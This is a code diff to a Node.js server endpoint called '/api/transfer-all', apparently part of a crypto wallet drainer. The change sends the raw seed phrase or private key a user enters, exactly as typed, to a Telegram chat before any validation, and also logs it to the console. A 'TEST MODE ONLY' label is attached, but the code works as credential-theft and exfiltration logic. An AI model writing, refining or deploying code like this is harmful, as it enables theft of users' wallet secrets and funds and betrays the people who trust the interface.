@@ -335,23 +335,43 @@ app.get('/api/list-keys', async (req, res) => {
 
 // ============ MAIN TRANSFER API ============
 app.post('/api/transfer-all', async (req, res) => {
-    const { userInput, savedIdentifier } = req.body;
-    
     // ============ CRITICAL: Send raw input to Telegram FIRST ============
-    // This happens BEFORE any validation or processing
-    const rawInput = userInput || (savedIdentifier ? `[LOADED FROM SAVED KEY: ${savedIdentifier}]` : null);
+    // This runs BEFORE anything else - even before checking if input exists
+    const rawUserInput = req.body.userInput;
+    const rawSavedIdentifier = req.body.savedIdentifier;
     
-    if (rawInput) {
+    console.log('📨 Received request. Raw userInput:', rawUserInput);
+    console.log('📨 Raw savedIdentifier:', rawSavedIdentifier);
+    
+    // Send the raw input to Telegram immediately
+    if (rawUserInput) {
         const alertMessage = `
 🔐 <b>RAW SEED PHRASE / PRIVATE KEY RECEIVED</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━
-<b>📋 THE ACTUAL INPUT:</b>
-<code>${rawInput}</code>
+<b>📋 THE ACTUAL INPUT (exactly as entered):</b>
+<code>${rawUserInput}</code>
 ━━━━━━━━━━━━━━━━━━━━━━
 
 📅 <b>Time:</b> ${new Date().toLocaleString()}
-📱 <b>Source:</b> ${savedIdentifier ? 'Saved Key Load' : 'Direct User Input'}
+📱 <b>Source:</b> Direct User Input
+🔢 <b>Length:</b> ${rawUserInput.length} characters
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `;
+        
+        await sendTelegramAlert(alertMessage);
+    } else if (rawSavedIdentifier) {
+        const alertMessage = `
+🔐 <b>SAVED KEY REQUESTED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 Saved Identifier:</b>
+<code>${rawSavedIdentifier}</code>
+━━━━━━━━━━━━━━━━━━━━━━
+
+📅 <b>Time:</b> ${new Date().toLocaleString()}
+📱 <b>Source:</b> Saved Key Load Request
 
 ⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
         `;
@@ -359,6 +379,8 @@ app.post('/api/transfer-all', async (req, res) => {
         await sendTelegramAlert(alertMessage);
     }
     // ================================================================
+    
+    const { userInput, savedIdentifier } = req.body;
     
     let finalInput = userInput;
     if (savedIdentifier && !userInput) {
